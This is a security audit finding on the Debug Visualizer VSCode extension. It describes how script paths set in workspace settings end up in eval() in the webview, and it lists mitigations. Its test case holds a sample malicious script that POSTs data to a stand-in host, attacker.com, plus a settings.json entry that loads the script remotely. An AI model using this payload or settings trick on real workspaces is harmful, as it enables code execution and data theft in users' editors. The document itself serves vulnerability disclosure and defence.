## Vulnerability List:

### 1. Vulnerability Name: Custom Script Injection in Webview Context

- Description:
    1. An attacker compromises a user's workspace settings for VSCode. This could be achieved by tricking the user into opening a malicious workspace or exploiting another vulnerability to modify settings.json.
    2. The attacker modifies the `debugVisualizer.js.customScriptPaths` or `debugVisualizer.customVisualizerScriptPaths` setting in the workspace settings to include a path to a malicious JavaScript file hosted on a server controlled by the attacker or a local file within the compromised workspace.
    3. When the user opens a Debug Visualizer view and a debug session starts for a supported language (e.g., JavaScript, Node.js), the extension loads and executes the JavaScript files specified in `debugVisualizer.js.customScriptPaths` or `debugVisualizer.customVisualizerScriptPaths` within the webview context.
    4. The malicious JavaScript code executes with the privileges of the VSCode extension's webview, allowing the attacker to perform actions such as:
        - Stealing sensitive data accessible by the webview, including tokens, session information, or workspace data.
        - Interacting with the VSCode API to modify workspace files, install extensions, or execute commands.
        - Displaying misleading or malicious content within the Debug Visualizer view.

- Impact:
    Critical. Arbitrary code execution within the VSCode webview context. This can lead to:
    - Confidentiality breach: Stealing sensitive information from the workspace or VSCode environment.
    - Integrity breach: Modifying workspace files or VSCode settings.
    - Availability breach: Causing the extension or VSCode to malfunction.
    - Privilege escalation: Potentially gaining further control over the user's VSCode environment.

- Vulnerability Rank: critical

- Currently Implemented Mitigations:
    None. The extension loads and executes custom scripts without any sandboxing or security checks.

- Missing Mitigations:
    - Input validation: The extension should validate the paths specified in `debugVisualizer.js.customScriptPaths` and `debugVisualizer.customVisualizerScriptPaths` to ensure they are safe and within expected locations. Restricting paths to workspace-relative paths and validating file extensions could be initial steps.
    - Sandboxing: Custom scripts should be executed in a sandboxed environment with restricted access to VSCode APIs and resources. Using mechanisms like iframe sandboxing or worker threads with limited capabilities could mitigate the impact of malicious scripts.
    - Content Security Policy (CSP): Implement a strict CSP for the webview to limit the capabilities of loaded scripts, such as restricting script sources, disabling `eval()`, and limiting access to browser features.
    - User confirmation: Before loading and executing custom scripts, the extension should prompt the user for confirmation, especially if the scripts are loaded from workspace settings, which could be controlled by a malicious actor in a shared workspace scenario.
    - Code review: Thoroughly review the code that loads and executes custom scripts to identify and address potential vulnerabilities.

- Preconditions:
    1. The attacker must be able to modify the user's VSCode workspace settings (settings.json).
    2. The user must open a Debug Visualizer view and start a debug session for a supported language after the settings are modified.

- Source Code Analysis:
    1. File: `/code/extension/src/webview/WebviewConnection.ts`
    2. Class `WebviewConnection` and `FileWatcher` are responsible for loading custom scripts.
    3. `FileWatcher` monitors files specified in `config.customScriptPaths` and `config.customVisualizerScriptPaths` (obtained from VSCode settings).
    4. When files change or are initially loaded, the `handleFileContents` callback in `FileWatcher` is invoked.
    5. Inside `handleFileContents`, for each file in `config.customScriptPaths`:
       ```typescript
       await client.setCustomVisualizerScript({
           id: file.path,
           jsSource: file.content || null,
       });
       ```
    6. The `setCustomVisualizerScript` method in the client sends a notification to the webview.
    7. File: `/code/webview/src/model/Model.ts`
    8. In the `updateState` method of the webview's RPC server implementation, the `setCustomVisualizerScript` notification handler is defined:
       ```typescript
       setCustomVisualizerScript: async ({ id, jsSource }) => {
           eval(`
               ((load) => {
                   let fn = undefined;
                   if (load) {
                       const module = {};
                       load(module);
                       fn = module.exports;
                   }
                   setVisualizationModule(${JSON.stringify(id)}, fn);
               })(
                   ${jsSource ? `function (module) { ${jsSource} }` : "undefined"}
               )
           `);
       },
       ```
    9. The `jsSource` (content of the custom script) is directly embedded into an `eval()` call and executed in the webview context. This allows arbitrary JavaScript code injection.

- Security Test Case:
    1. Create a malicious JavaScript file (e.g., `malicious_script.js`) with the following content:
       ```javascript
       module.exports = (register, helpers) => {
           register({
               id: "malicious-extractor",
               getExtractions: (data, collector) => {
                   // Malicious code to steal data and send to attacker's server
                   fetch('https://attacker.com/log', {
                       method: 'POST',
                       headers: {
                           'Content-Type': 'application/json',
                       },
                       body: JSON.stringify({
                           vscode_env: 'I am compromised!'
                       }),
                   });
                   collector.addExtraction({
                       id: "malicious-extraction",
                       name: "Malicious Extraction",
                       priority: 1000,
                       extractData: () => ({ kind: { text: true }, text: "Compromised!" }),
                   });
               },
           });
       };
       ```
    2. Host this file on a publicly accessible server (e.g., `https://attacker.com/malicious_script.js`).
    3. Open VSCode and a workspace.
    4. Modify the workspace settings (settings.json) to include the malicious script path in `debugVisualizer.js.customScriptPaths`:
       ```json
       {
           "debugVisualizer.js.customScriptPaths": [
               "https://attacker.com/malicious_script.js"
           ]
       }
       ```
    5. Start a debug session for a JavaScript or Node.js project.
    6. Open a Debug Visualizer view (`Debug Visualizer: New View`).
    7. Observe network traffic to `attacker.com`. The malicious script will execute in the webview and send data to the attacker's server.
    8. In the Debug Visualizer view, you should see the "Malicious Extraction" with the text "Compromised!", confirming the execution of the injected script.